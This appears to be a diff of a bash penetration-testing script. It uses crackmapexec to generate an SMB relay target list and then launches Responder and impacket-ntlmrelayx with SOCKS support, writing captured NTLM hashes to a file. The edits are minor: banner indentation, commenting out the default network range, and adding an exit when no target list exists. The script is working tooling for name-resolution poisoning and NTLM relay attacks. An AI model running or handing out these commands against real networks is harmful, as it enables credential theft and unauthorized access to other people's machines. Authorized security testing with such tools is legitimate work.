@@ -51,7 +51,7 @@ echo -e "${GREEN}                                   %%%%%%%%%%%#/,              
 echo -e "${GREEN}                                                                                ${RESET}"
 echo -e "${GREEN}                                                                                 ${RESET}"
 echo -e "${GREEN}                                                                                 ${RESET}"
-echo -e "${GREEN} by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon ${RESET}"
+echo -e "${GREEN}               by ${BLUE}Kyle Hoehn ${RED}with code stealing ${GREEN}from ${BLUE}Chris McMahon ${RESET}"
 echo -e "${GREEN}                                                                                 ${RESET}"
 echo -e "${GREEN}                                                                                 ${RESET}"
 
@@ -62,7 +62,7 @@ if [[ $(/usr/bin/id -u) -ne 0 ]]; then
 fi
 
 #Set Range to Ethernet Adapter by default unless a range is specified with -r
-range="$(ip a | grep -w "inet" | cut -d " " -f 6 | grep -v "127.0.0.1/8")"
+#range="$(ip a | grep -w "inet" | cut -d " " -f 6 | grep -v "127.0.0.1/8")"
 
 #Options
 while getopts 'r:h' opt; do
@@ -170,10 +170,10 @@ crackmapexec smb ${range} --gen-relay-list ${varWorkingDir}/relay_targets.txt
 echo -e "[${GREEN}+${RESET}] Checking for relay list."
 if [ ! -f "${varWorkingDir}/relay_targets.txt" ]; then
   echo -e "[${RED}!${RESET}] ${RED}Relay file does not exist.${RESET} ${YELLOW}Sorry about your luck...${RESET}"
+  exit 2
 else
   echo -e "[${GREEN}*${RESET}] ${RED}LET THE GAMES BEGIN!${RESET}"
   terminator -e "responder -I eth0 -w"
   terminator -e "impacket-ntlmrelayx -tf ${varWorkingDir}/relay_targets.txt -smb2support -socks --output-file ${varWorkingDir}/ntlmrelayx_hashes.out"
+  echo -e "Www.. what am I, a hack?! Go nuts, Morty, it's full proof."
 fi
-
-echo -e "Www.. what am I, a hack?! Go nuts, Morty, it's full proof."
